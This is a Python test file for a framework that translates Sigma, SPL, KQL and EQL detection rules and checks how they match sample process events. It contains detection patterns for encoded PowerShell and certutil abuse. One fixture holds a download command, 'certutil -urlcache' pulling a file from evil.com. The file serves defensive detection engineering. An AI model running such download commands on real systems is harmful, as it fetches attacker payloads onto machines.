"""
Unit & Integration Tests for Phase 2C Deterministic Translation Framework.
Verifies Sigma, SPL, KQL, and EQL translators.
Enforces NO SILENT WEAKENING: ensures unsupported constructs (rex, eval, aggregations)
are explicitly recorded and flagged fatal.
"""
import pytest
from detection_content.canonical_ir import TranslationFidelity
from detection_content.translation import (
    EQLTranslator,
    KQLTranslator,
    SigmaTranslator,
    SPLTranslator,
    TRANSLATION_MANAGER,
)


def test_sigma_translation_exact_and_evaluation():
    sigma_yaml = """
title: Encoded PowerShell Execution
id: 5b4974f1-670a-471a-986c-0fc3cb0eb8ff
status: test
description: Detects base64 encoded command arguments in PowerShell
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\\powershell.exe'
        CommandLine|contains:
            - '-enc '
            - '-encodedcommand '
    condition: selection
level: high
tags:
    - attack.execution
    - attack.t1059.001
"""
    res = SigmaTranslator().translate(sigma_yaml)
    assert res.success is True
    assert res.fidelity in (TranslationFidelity.EXACT, TranslationFidelity.STRONG)
    assert res.ir is not None
    assert res.ir.content_id.startswith("DET-SIGMA-")
    assert "process.command_line" in res.ir.required_fields

    # Positive evaluation
    matched_ev = {
        "process": {
            "name": "powershell.exe",
            "command_line": "powershell.exe -enc SQBFAFgA...",
        }
    }
    assert res.ir.evaluate(matched_ev) is True

    # Negative evaluation
    clean_ev = {
        "process": {
            "name": "powershell.exe",
            "command_line": "powershell.exe Get-Service",
        }
    }
    assert res.ir.evaluate(clean_ev) is False


def test_sigma_unsupported_aggregation_no_silent_weakening():
    sigma_agg = """
title: Multiple Failed Logins
id: 11111111-2222-3333-4444-555555555555
logsource:
    product: windows
detection:
    selection:
        EventID: 4625
    timeframe: 5m
    condition: selection | count() by User > 5
"""
    res = SigmaTranslator().translate(sigma_agg)
    # Must fail or be flagged unsupported/partial; must NOT silently strip the aggregation!
    assert res.fidelity in (TranslationFidelity.UNSUPPORTED, TranslationFidelity.PARTIAL)
    assert len(res.unsupported_constructs) > 0
    assert any("aggregation" in u.construct_name for u in res.unsupported_constructs)


def test_spl_translation_and_unsupported_rex():
    spl_valid = 'search index=endpoint process="powershell.exe" CommandLine="*-enc*"'
    res = SPLTranslator().translate(spl_valid)
    assert res.success is True
    assert res.ir is not None

    ev = {
        "process": {
            "name": "powershell.exe",
            "command_line": "powershell.exe -enc test",
        }
    }
    assert res.ir.evaluate(ev) is True

    # Test SPL with unsupported rex command
    spl_rex = 'search index=endpoint | rex field=CommandLine "(?<encoded>[A-Za-z0-9+/=]{20,})"'
    res_rex = SPLTranslator().translate(spl_rex)
    assert res_rex.fidelity == TranslationFidelity.UNSUPPORTED
    assert any("rex" in u.construct_name for u in res_rex.unsupported_constructs)
    assert res_rex.unsupported_constructs[0].fatal is True


def test_kql_translation_and_evaluation():
    kql_query = 'DeviceProcessEvents | where FileName =~ "certutil.exe" | where ProcessCommandLine has "urlcache"'
    res = KQLTranslator().translate(kql_query)
    assert res.success is True
    assert res.ir is not None
    assert res.fidelity in (TranslationFidelity.EXACT, TranslationFidelity.STRONG)

    ev = {
        "process": {
            "name": "certutil.exe",
            "command_line": "certutil.exe -urlcache -f http://evil.com/x",
        }
    }
    assert res.ir.evaluate(ev) is True


def test_eql_translation_and_sequence():
    eql_single = 'process where process.name == "cmd.exe" and process.command_line : "*whoami*"'
    res = EQLTranslator().translate(eql_single)
    assert res.success is True
    assert res.ir is not None

    ev = {
        "process": {
            "name": "cmd.exe",
            "command_line": "cmd.exe /c whoami /all",
        }
    }
    assert res.ir.evaluate(ev) is True

    # EQL Sequence
    eql_seq = 'sequence by host.id with maxspan=10m [process where process.name == "whoami.exe"] [network where destination.port == 443]'
    res_seq = EQLTranslator().translate(eql_seq)
    assert res_seq.success is True
    assert res_seq.ir.is_correlation is True
    assert res_seq.fidelity == TranslationFidelity.STRONG


def test_translation_manager_auto_routing():
    sigma_text = "detection:\n  selection:\n    Image: calc.exe\n  condition: selection"
    res_sig = TRANSLATION_MANAGER.translate(sigma_text)
    assert res_sig.ir is not None

    kql_text = 'DeviceProcessEvents | where FileName =~ "calc.exe"'
    res_kql = TRANSLATION_MANAGER.translate(kql_text)
    assert res_kql.ir is not None

    stats = TRANSLATION_MANAGER.get_stats()
    assert stats["total"] >= 2
